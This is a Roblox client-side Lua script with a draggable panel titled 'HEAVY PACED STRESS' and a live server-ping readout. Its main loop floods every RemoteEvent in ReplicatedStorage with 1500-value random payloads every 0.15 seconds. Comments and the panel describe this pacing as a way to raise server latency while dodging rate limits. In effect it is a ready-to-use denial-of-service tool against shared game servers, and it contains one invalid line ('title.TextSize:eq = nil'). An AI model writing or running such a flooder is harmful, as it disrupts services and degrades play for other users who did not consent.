-- language: Lua, file: server_stress_heavy.lua, target: Roblox Client / High Intensity Paced Stress
-- *Zwiększona intensywność obciążenia replikacji z licznikiem rzeczywistego pingu serwera (Data Ping)*

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local Stats = game:GetService("Stats")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")

local player = Players.LocalPlayer
local old = player.PlayerGui:FindFirstChild("ServerStressPanel")
if old then old:Destroy() end

local gui = Instance.new("ScreenGui")
gui.Name = "ServerStressPanel"
gui.ResetOnSpawn = false
gui.IgnoreGuiInset = true
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.fromOffset(340, 420)
frame.Position = UDim2.new(0.5, -170, 0.5, -210)
frame.BackgroundColor3 = Color3.fromRGB(12, 10, 18)
frame.BackgroundTransparency = 0.05
frame.BorderSizePixel = 0
frame.Active = true
frame.ClipsDescendants = true
frame.Parent = gui

Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 16)

local stroke = Instance.new("UIStroke", frame)
stroke.Color = Color3.fromRGB(255, 0, 120)
stroke.Thickness = 2
stroke.Transparency = 0.15

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 48)
title.BackgroundColor3 = Color3.fromRGB(50, 15, 60)
title.BackgroundTransparency = 0.3
title.Text = "  MADlUM // HEAVY PACED STRESS"
title.TextColor3 = Color3.fromRGB(255, 120, 210)
title.Font = Enum.Font.GothamBold
title.TextSize:eq = nil
title.TextSize = 12
title.TextXAlignment = Enum.TextXAlignment.Left
title.Parent = frame
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 16)

-- Panel telemetrii (Server Ping & Status)
local telemetryFrame = Instance.new("Frame")
telemetryFrame.Size = UDim2.new(0.9, 0, 0, 65)
telemetryFrame.Position = UDim2.new(0.05, 0, 0, 55)
telemetryFrame.BackgroundColor3 = Color3.fromRGB(20, 12, 30)
telemetryFrame.Parent = frame
Instance.new("UICorner", telemetryFrame).CornerRadius = UDim.new(0, 10)

local serverPingLabel = Instance.new("TextLabel")
serverPingLabel.Size = UDim2.new(1, -20, 0.5, 0)
serverPingLabel.Position = UDim2.new(0, 10, 0, 5)
serverPingLabel.BackgroundTransparency = 1
serverPingLabel.Text = "SERVER PING: 0 ms"
serverPingLabel.TextColor3 = Color3.fromRGB(0, 240, 255)
serverPingLabel.Font = Enum.Font.GothamBold
serverPingLabel.TextSize = 13
serverPingLabel.TextXAlignment = Enum.TextXAlignment.Left
serverPingLabel.Parent = telemetryFrame

local statusLabel = Instance.new("TextLabel")
statusLabel.Size = UDim2.new(1, -20, 0.5, 0)
statusLabel.Position = UDim2.new(0, 10, 0.5, 0)
statusLabel.BackgroundTransparency = 1
statusLabel.Text = "STATUS: IDLE"
statusLabel.TextColor3 = Color3.fromRGB(150, 130, 180)
statusLabel.Font = Enum.Font.GothamMedium
statusLabel.TextSize = 12
statusLabel.TextXAlignment = Enum.TextXAlignment.Left
statusLabel.Parent = telemetryFrame

local toggleBtn = Instance.new("TextButton")
toggleBtn.Size = UDim2.new(0.9, 0, 0, 52)
toggleBtn.Position = UDim2.new(0.05, 0, 0, 135)
toggleBtn.BackgroundColor3 = Color3.fromRGB(50, 25, 80)
toggleBtn.Text = "START HEAVY STRESS"
toggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
toggleBtn.Font = Enum.Font.GothamBold
toggleBtn.TextSize = 13
toggleBtn.AutoButtonColor = false
toggleBtn.Parent = frame
Instance.new("UICorner", toggleBtn).CornerRadius = UDim.new(0, 10)

local infoBox = Instance.new("TextLabel")
infoBox.Size = UDim2.new(0.9, 0, 0, 95)
infoBox.Position = UDim2.new(0.05, 0, 0, 205)
infoBox.BackgroundColor3 = Color3.fromRGB(16, 10, 24)
infoBox.Text = " TARGET: RemoteEvents\n INTENSITY: High Payload\n BYPASS: Safe Interval Pacing"
infoBox.TextColor3 = Color3.fromRGB(140, 120, 180)
infoBox.Font = Enum.Font.Code
infoBox.TextSize = 11
infoBox.TextXAlignment = Enum.TextXAlignment.Left
infoBox.TextYAlignment = Enum.TextYAlignment.Top
infoBox.Parent = frame
Instance.new("UICorner", infoBox).CornerRadius = UDim.new(0, 10)

local infoPadding = Instance.new("UIPadding", infoBox)
infoPadding.PaddingTop = UDim.new(0, 12)
infoPadding.PaddingLeft = UDim.new(0, 12)

local credits = Instance.new("TextLabel")
credits.Size = UDim2.new(1, 0, 0, 20)
credits.Position = UDim2.new(0, 0, 1, -25)
credits.BackgroundTransparency = 1
credits.Text = "crafted by R9K"
credits.TextColor3 = Color3.fromRGB(80, 60, 110)
credits.Font = Enum.Font.Gotham
credits.TextSize = 10
credits.Parent = frame

local active = false
local stressThread

toggleBtn.MouseButton1Click:Connect(function()
    active = not active
    if active then
        TweenService:Create(toggleBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(220, 40, 130)}):Play()
        toggleBtn.Text = "STOP HEAVY STRESS"
        statusLabel.Text = "STATUS: RUNNING (HEAVY)"
        statusLabel.TextColor3 = Color3.fromRGB(255, 100, 200)

        stressThread = task.spawn(function()
            while active do
                pcall(function()
                    for _, v in ipairs(ReplicatedStorage:GetDescendants()) do
                        if v:IsA("RemoteEvent") or v:IsA("UnreliableRemoteEvent") then
                            local payload = {}
                            -- Zwiększona paczka danych obciążająca bufor replikacji
                            for i = 1, 1500 do
                                table.insert(payload, math.random() * 1e5)
                            end
                            v:FireServer(payload)
                        end
                    end
                end)
                -- Krótszy, ale wciąż bezpieczny interwał pozwalający podnieść ms bez natychmiastowego uderzenia w limit 267
                task.wait(0.15)
            end
        end)
    else
        active = false
        TweenService:Create(toggleBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(50, 25, 80)}):Play()
        toggleBtn.Text = "START HEAVY STRESS"
        statusLabel.Text = "STATUS: IDLE"
        statusLabel.TextColor3 = Color3.fromRGB(150, 130, 180)
    end
end)

-- Pobieranie rzeczywistego pingu serwera Roblox w czasie rzeczywistym
game:GetService("RunService").Heartbeat:Connect(function()
    local success, pingVal = pcall(function()
        return Stats.Network.ServerStatsItem["Data Ping"]:GetValue()
    end)
    if success and pingVal then
        serverPingLabel.Text = string.format("SERVER PING: %d ms", math.floor(pingVal))
    else
        serverPingLabel.Text = "SERVER PING: N/A"
    end
end)

local dragging, dragStart, startPos

title.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = frame.Position
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        local delta = input.Position - dragStart
        frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)

UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = false
    end
end)
